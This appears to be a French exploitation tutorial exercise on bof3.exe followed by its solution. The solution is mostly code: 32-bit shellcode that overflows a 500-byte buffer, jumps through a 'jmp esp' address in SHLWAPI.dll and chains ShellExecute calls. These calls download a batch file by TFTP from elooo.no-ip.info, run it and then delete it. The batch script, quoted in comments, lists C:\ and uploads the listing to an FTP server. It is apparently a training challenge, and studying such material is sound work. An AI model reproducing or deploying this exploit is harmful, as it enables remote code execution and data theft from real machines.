@@ -1,0 +1,163 @@
+
+*** Travail à faire pour le bof3.exe - Intitulé de oko ***
+
+"Pour le deuxième programme bof3.exe (en console, le fichier est présent dans le repertoire de ce tuto), je veux 
+un shellcode qui va vous permettre de récupérer la liste des rép/fichiers à la racine du dd (on dira que c'est 
+C: pour simplifier), et donc immaginer un moyen de récupérer cette liste sur votre serveur web (tout cela en 
+n'utilisant que les fonctions importées du programme, sans en importer d'autres hein, car ca sera l'objet du prochain topic )
+Il y a plusieurs moyens possibles... (Enfin j'en vois déjà 2 )
+Je n'ai pas encore fait mon shellcode mais le buffer est bien gros je pense que ca suffira, sinon j'agrandirai 
+ca
+Il va bien sûr aussi falloir trouver le moyen de jumper sur le shellcode, je n'ai personnelement pas trouvé 
+comment faire depuis le code du programme (si quelqu'un trouve qu'il fasse signe ), mais vous pouvez utiliser 
+le code des dlls importées... (un saut vers la pile par exemple )
+
+Voilou,
+bonne chance à tous" 
+
+
+
+*** Solution pour le bof3.exe ***
+
+===================================================================
+[BITS 32]
+
+; declaration des commandes que je vais executer
+db 'TFTP',0
+db '-i elooo.no-ip.info GET script.bat',0
+db 'script.bat',0
+db 'cmd',0
+db '/C del script.bat /F',0
+
+; debut de ce code en 12FDDC (connection sur mon tftp pour dl le bat chez moi). Je jump la au 
+; 1er passage.
+
+xor ecx, ecx
+sub sp, 0x1F8 			; je reequilibre la pile
+mov cl, 0x0A
+push ecx 			; push 0x0000000A
+xor cl,0x0A
+push ecx 			; push 0
+mov ax, 0xFD95
+push eax 			; push offset '-i elooo.no-ip.info GET script.bat'
+xor al, 5
+push eax 			; push offset 'TFTP'
+mov eax, 0x6F6F6F6F
+xor eax, 0x6F2F7F53 		; je recup l'adresse vers le push open
+mov bp, 0xFC1E 			; j'adapte la valeur d'ebp pour sauter au prochain bout de code
+jmp eax 			; jmp push open de shellexecute
+
+; debut de ce code en 12FE02 (execution du bat). Je jump la au 2eme passage.
+
+xor ecx, ecx
+sub sp, 0x1F8 			; je reequilibre la pile
+mov cl, 0x0A
+push ecx 			; push 0x0000000A
+xor cl, 0x0A
+push ecx 			; push 0
+push ecx 			; push 0
+mov ax, 0xFDB8
+push eax 			; push offset 'script.bat'
+mov eax, 0x6F6F6F6F
+xor eax, 0x6F2F7F53 		; je recup l'adresse vers le push open
+mov bp, 0xFC3A 			; j'adapte la valeur d'ebp pour sauter au prochain bout de code
+jmp eax 			; jmp push open de shellexecute
+
+; debut de ce code en 12FE26 (suppression du bat). Je jump la au 3eme passage.
+
+xor ecx, ecx
+sub sp, 0x1F8 			; je reequilibre la pile
+mov cl, 0x0A
+push ecx 			; push 0x0000000A
+xor cl, 0x0A
+push ecx 			; push 0
+mov ax, 0xFDC7
+push eax 			; push offset '/C del script.bat /F'
+xor al, 4
+push eax 			; push offset 'cmd'
+mov eax, 0x6F6F6F6F
+xor eax, 0x6F2F7F53 		; je recup l'adresse vers le push open
+mov bp, 0xFC50 			; j'adapte la valeur d'ebp pour sauter au prochain bout de code
+jmp eax 			; jmp push open de shellexecute
+
+mov eax, 0x6F6F6F6F 		; Je sors et je quitte le prog proprement. Je jump la au 4eme passage.
+xor eax, 0x6F2F7EAB 		; 4011C4 -> call exitprocess
+jmp eax 			; jump call exitprocess
+
+TIMES 0x1F4-($-$$) db 0x6F 	; dit au compilo de remplir le reste avec des 'o'
+				; car l'o j'aime ca
+
+; "jmp esp" dans SHLWAPI.dll
+
+dd 0x70A711FD 			; l'adresse de retour sur laquelle je vais jumper 4 fois. 
+				; On arrive la au moment du BoF
+
+mov eax, ebp 			; ebp = 12FFC0 (valeur fixe qui ne change pas)
+xor ax, 0x021C 			; je vais la xorer successivement pour sauter au bon endroit
+jmp eax 			; sur mon shellcode, a chaque fois
+
+
+; ------- CONTENU DE MON script.BAT -------
+; @ECHO OFF
+; :: Creation du fichier script.ftp avec mes infos de connection au serveur
+; > script.ftp ECHO open ftpperso.free.fr
+; >>script.ftp ECHO mon_login
+; >>script.ftp ECHO mon_pass
+; >>script.ftp ECHO binary
+; >>script.ftp ECHO put dir.log
+; >>script.ftp ECHO quit
+; :: Je recupere le listing des fichiers et dossiers sur C:\ dans dir.log
+; dir c:\ > dir.log
+; :: Je lance ma commande FTP pour me connecter au serveur et uploader le fichier
+; FTP -v -s:script.ftp
+; :: Je supprime dir.log
+; TYPE NUL >dir.log
+; DEL dir.log
+; :: Je supprime script.ftp
+; TYPE NUL >script.ftp
+; DEL script.ftp
+; GOTO End
+; :End
+
+; L'autre possibilite sans passer par le tftp aurait ete de passer chaque ligne de commande dans
+; le shellexecute :
+; edit script.ftp
+; cmd /C echo open ftpperso.free.fr> script.ftp
+; cmd /C echo mon_login>> script.ftp
+; cmd /C echo mon_pass>> script.ftp
+; cmd /C echo binary>> script.ftp
+; cmd /C echo put dir.log>> script.ftp
+; cmd /C echo quit>> script.ftp
+; cmd /C dir c:\ > dir.log
+; FTP -v -s:script.ftp
+; cmd /C del script.ftp /F
+; cmd /C del dir.log /F
+; cmd /C del script.bat /F
+
+; Bref ca faisait plus a coder sans le tftp mais la methode etait la meme, au lieu de passer 4 fois dans
+; shellexecute, on y passe 13 fois quoi :/
+; Evidemment si on n'a pas de serveur tftp chez soit ma methode avec tftp ne marchera pas si on remplace
+; elooo.no-ip.info par sa propre IP
+; J'aurais pu utiliser aussi tftp pour m'uploader dir.log directement sur mon
+; serveur tftp mais ça simplifiait beaucoup trop... j'ai pas voulu abuser
+; Ah vi tiens j'en ai meme pas parlé... le buffer est de 500 cette fois-ci, avec
+; l'adresse de retour juste apres sur la pile. Donc il suffit de mettre dans le buffer
+; 500 caracteres + une adresse judicieusement choisie et on ret dessus. (et pour les
+; bourrins : plus de 500 caracteres quelconques et on crashe).
+
+===================================================================
+
+Ah vi au fait, c'est pas du code relogeable (enfin je pense que ça se voit ).
+
+Ah pour finir : mon truc y'a peu de chance que ça marche chez quelqu'un d'autre du fait que mon 
+truc est carrement pas adapté pour etre "universel" D'où l'utilité du code relogeable (on y 
+revient grrr ).
+Déjà rien que pour le "jmp esp" de la dll, si vous etes pas sous XP SP1, il se peut très 
+fortement que l'adresse ne soit pas la même...
+
+Ce qui donne dans l'éditeur hexa :
+
+Fichier "shell3.png" à l'interieur du dossier de ce tuto.
+
+-------
+elooo.
